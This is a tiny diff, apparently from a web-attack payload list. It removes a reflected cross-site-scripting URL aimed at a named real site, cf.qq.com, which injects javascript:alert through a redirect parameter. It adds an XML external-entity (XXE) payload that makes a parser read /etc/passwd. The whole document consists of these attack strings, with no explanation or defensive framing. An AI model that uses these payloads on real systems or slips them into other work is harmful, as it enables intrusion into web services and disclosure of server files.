@@ -1,1 +1,4 @@
-http://cf.qq.com/wx/loginIframe.htm?s_url=javascript:alert`999`#<script src="http://js.aq.qq.com/js/aq_common.js"></script>
+  <?xml version="1.0" encoding="ISO-8859-1"?>
+ <!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
